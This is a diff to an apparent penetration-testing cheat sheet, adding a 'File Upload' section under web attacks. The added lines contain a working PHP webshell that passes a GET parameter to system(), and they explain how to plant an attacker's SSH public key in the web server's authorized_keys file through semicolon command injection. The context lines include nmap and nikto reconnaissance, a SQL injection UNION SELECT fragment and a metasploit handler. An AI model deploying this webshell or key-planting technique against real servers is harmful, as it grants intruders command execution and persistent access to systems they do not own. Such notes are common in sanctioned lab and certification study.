@@ -23,7 +23,7 @@ Port Interrogation
     nc <ip> <port>
  
 ###################
-Web Recon:
+Web Stuff:
 ###################
     nikto -h <ip>
     nmap -St -T4 <ip> -p80 --script http-enum.nse   #money
@@ -50,6 +50,34 @@ Web Recon:
       UNION SELECT 1,2,@@version
         Displays version #
         
+    File Upload:
+      webshell:
+          <HTML><BODY>
+          <FORM METHOD="GET" NAME="myform" ACTION="">
+          <INPUT TYPE="text" NAME="cmd">
+          <INPUT TYPE="submit" VALUE="Send">
+          </FORM>
+          <pre>
+          <?php
+          if($_GET['cmd']) {
+            system($_GET['cmd']);
+            }
+          ?>
+          </pre>
+          </BODY></HTML>
+        
+      ssh key upload
+      www-data
+      ssh-keygen -t rsa
+      cat ~/.ssh/id_rsa.pub #copy
+      
+      now do a command injection on the web server to make ssh directory:
+          ; mkdir /var/www/.ssh   #or user key
+          ; echo "<full key>" >> /var/www/.ssh/authorized_keys
+          ; cat /var/www/.ssh/authorized_keyss
+    
+    
+    
 ###################
 Buffer Overflow:
 ###################
@@ -202,9 +230,6 @@ Buffer Overflow:
     run script
     run multi/handler  
 
-
-
-  
   
 ###################  
 POST EXPLOITATION
